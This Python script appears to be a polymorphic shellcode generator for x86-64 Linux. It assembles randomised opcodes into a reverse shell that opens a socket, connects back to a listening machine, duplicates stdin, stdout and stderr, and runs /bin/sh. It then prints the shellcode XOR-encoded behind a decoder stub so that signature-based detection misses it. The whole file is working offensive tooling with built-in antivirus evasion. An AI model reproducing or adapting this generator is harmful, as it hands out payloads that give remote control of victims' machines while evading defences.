
from random import randint as rr
from opcodelist import *

#Function to clean the main registers before launching the program
def clean(result):
    
    list_registre = ["rax", "rbx", "rcx", "rdx", "rdi", "rsi"] # List used to randomise the order
    
    while len(list_registre) > 0: # As long as the list is not empty
        
        num = rr(0,len(list_registre)-1) # Draw a random number
        if str(list_registre[num]) == "rax": # Clean RAX register
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # Randomly retrieve one of the opcodes from the previously filled table
            del list_registre[num] # Remove the element from the list to avoid repeating a rax clean

        elif str(list_registre[num]) == "rbx": # Clean RXB register
            result += list_xor_rbx[rr(0,len(list_xor_rbx)-1)]
            del list_registre[num]

        elif str(list_registre[num]) == "rcx":
            result += list_xor_rcx[rr(0,len(list_xor_rcx)-1)]
            del list_registre[num]

        elif str(list_registre[num]) == "rdi":
            result += list_xor_rdi[rr(0,len(list_xor_rdi)-1)]
            del list_registre[num]

        elif str(list_registre[num]) == "rsi":
            result += list_xor_rsi[rr(0,len(list_xor_rsi)-1)]
            del list_registre[num]

        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)]
            del list_registre[num]

    return(result) # Return the opcodes one after the other

# Function to create the socket that will be used to connect
def create_socket(result):

    list_registre = ["al", "rdi", "rsi"] # List used to randomise the order (for instruction blocks that can be reversed)

    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1) # Draw a random number

        # We put 0x29 in the al register (for the system call)
        if str(list_registre[num]) == "al":
            result += list_mov_al_29[rr(0,len(list_mov_al_29)-1)] # mov al, 0x29
            del list_registre[num]

        # Put Ox02 in the bl register and then in rdi
        elif str(list_registre[num]) == "rdi":
            result += list_mov_bl_02[rr(0,len(list_mov_bl_02)-1)] # mov bl, 0x02
            result += list_mov_rdi[rr(0,len(list_mov_rdi)-1)] # mov rdi, rbx
            del list_registre[num]

        # Put Ox02 in the bl register and then in rsi
        elif str(list_registre[num]) == "rsi":
            result += list_mov_bl_01[rr(0,len(list_mov_bl_01)-1)] # mov bl, 0x01
            result += list_mov_rsi[rr(0,len(list_mov_rsi)-1)] # mov rsi, rbx
            del list_registre[num]

    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall
    return(result)

# Function used to connect to the listening machine using the socket
def connect_socket(result):
    list_registre = ["rdi", "r10"]

    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)

        if str(list_registre[num]) == "rdi":
            result += list_mov_rdi_rax[rr(0,len(list_mov_rdi_rax)-1)] # mov rdi, rax
            del list_registre[num]

        elif str(list_registre[num]) == "r10":
            result += list_mov_r10_rax[rr(0,len(list_mov_r10_rax)-1)] # mov r10, rax
            del list_registre[num]

    result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # xor rax, rax
    result += list_mov_al_02[rr(0,len(list_mov_al_02)-1)] # mov al, 0x2a
    result += list_xor_rbx[rr(0,len(list_xor_rbx)-1)] # xor rbx, rbx
    result += list_push_rbx[rr(0,len(list_push_rbx)-1)] # push rbx
    result += list_mov_esi_02[rr(0,len(list_mov_esi_02)-1)] # mov esi, 0x020ffff80 
    result += list_sub_esi_01[rr(0,len(list_sub_esi_01)-1)] # sub esi, 0x010ffff01
    result += list_pushw_01[rr(0,len(list_pushw_01)-1)] # pushw 0x1D23 
    result += list_pushw_02[rr(0,len(list_pushw_02)-1)] # pushw 0x02 
    result += list_mov_rsi_rsp[rr(0,len(list_mov_rsi_rsp)-1)] # mov rsi, rsp
    result += list_mov_dl_24[rr(0,len(list_mov_dl_24)-1)] # mov dl, 0x24
    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism
    return(result)

# Function to create files descriptor for stdin, stdout and stderr
def dup2x3(result):
    list_registre = ["rax", "rdx"]

    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)

        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # xor rax, rax
            del list_registre[num]

        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)] # xor rdx, rdx
            del list_registre[num]

    result += list_mov_al_21[rr(0,len(list_mov_al_21)-1)] # mov al, 0x21
    result += list_mov_rdi_r10[rr(0,len(list_mov_rdi_r10)-1)] # mov rdi, r10 
    result += list_xor_rsi[rr(0,len(list_xor_rsi)-1)] # xor rsi, rsi 
    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall


    list_registre = ["rax", "rdx"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)

        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] #  xor rax, rax
            del list_registre[num]

        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)] # xor rdx, rdx
            del list_registre[num]

    result += list_mov_al_21[rr(0,len(list_mov_al_21)-1)] # mov al, 0x21
    result += list_mov_rdi_r10[rr(0,len(list_mov_rdi_r10)-1)]  # mov rdi, r10
    result += list_inc_rsi[rr(0,len(list_inc_rsi)-1)] # inc rsi
    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall


    list_registre = ["rax", "rdx"]
    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)

        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)]  # xor rax, rax
            del list_registre[num]
        
        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)]  # xor rdx, rdx
            del list_registre[num]


    result += list_mov_al_21[rr(0,len(list_mov_al_21)-1)] # mov al, 0x21
    result += list_mov_rdi_r10[rr(0,len(list_mov_rdi_r10)-1)] # mov rdi, r10
    result += list_inc_rsi[rr(0,len(list_inc_rsi)-1)] # inc rsi
    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism
    return(result)

# Launching /bin/bash
def bash_plz(result):
    list_registre = ["rax", "rdx"]

    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)

        if str(list_registre[num]) == "rax":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # xor rax, rax
            del list_registre[num]
        
        elif str(list_registre[num]) == "rdx":
            result += list_xor_rdx[rr(0,len(list_xor_rdx)-1)] # xor rdx, rdx
            del list_registre[num]


    result += list_mov_68[rr(0,len(list_mov_68)-1)] # mov rbx, 0x68732f6e69622f2f
    result += list_push_rax[rr(0,len(list_push_rax)-1)] # push rax
    result += list_push_rbx[rr(0,len(list_push_rbx)-1)] # push rbx
    result += list_mov_rdi_rsp[rr(0,len(list_mov_rdi_rsp)-1)] # mov rdi, rsp
    result += list_push_rax[rr(0,len(list_push_rax)-1)]  # push rax
    result += list_push_rdi[rr(0,len(list_push_rdi)-1)] # push rdi
    result += list_mov_rsi_rsp[rr(0,len(list_mov_rsi_rsp)-1)] # mov rsi, rsp
    result += list_mov_al_03b[rr(0,len(list_mov_al_03b)-1)] # mov al, 0x3b
    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall, can't do polymorphism
    return(result)

# Exit function for assembler program
def exit_asm(result):
    list_registre = ["rax", "rdx"]

    while len(list_registre) > 0:
        num = rr(0,len(list_registre)-1)

        if str(list_registre[num]) == "rax":
            result += list_xor_rdi[rr(0,len(list_xor_rdi)-1)] # xor rdi, rdi
            del list_registre[num]
        
        elif str(list_registre[num]) == "rdx":
            result += list_xor_rax[rr(0,len(list_xor_rax)-1)] # xor rax, rax
            del list_registre[num]

    result += list_mov_al_03c[rr(0,len(list_mov_al_03c)-1)] # mov al, 0x3c 
    result += list_syscall[rr(0,len(list_syscall)-1)] # Syscall
    return(result)

# Function used to encode shellcode
def xor(SC):
    
    key = 4 # value used for xor
    SC_bytes = bytes.fromhex(SC) # we pass our shellcode in bytes for later use

    # We add the \x to our shellcode (which is basically in hexa with all the opcodes one after the other)
    SC_hex = [SC[i:i+2] for i in range(0, len(SC), 2)]
    SC_str = "".join(["\\x" + x for x in SC_hex])

    print("\n\n", SC_str, "\n\n")# Shellcode not encoded with \x
    print("Shellcode Encoded : \n") # Display of final shellcode (encoded)

    # Opcodes that will be used to decode our shellcode before it is executed
    print("\\xeb\\x11\\x5e\\x31\\xc9\\xb1" + "\\x{:02x}".format(int(len(SC_str)/4)) + "\\x80\\x74\\x0e\\xff" + "\\x{:02x}".format(key) + "\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff", end="")

    # Encoding our reverse shell
    for byte in SC_bytes:
        encoded_byte = byte ^ key
        print("\\x{:02x}".format(encoded_byte), end="")

    print("\n")

# Function that calls all the others
def construct(result):
    result = clean(result)
    result = create_socket(result)
    result = connect_socket(result)
    result = dup2x3(result)
    result = bash_plz(result)
    result = exit_asm(result)
    return(result)

def main():
    result = ""
    print("\nGeneration de votre shellcode ...\n")
    result = (construct(result))
    xor(result)

if __name__ == '__main__':
    main()
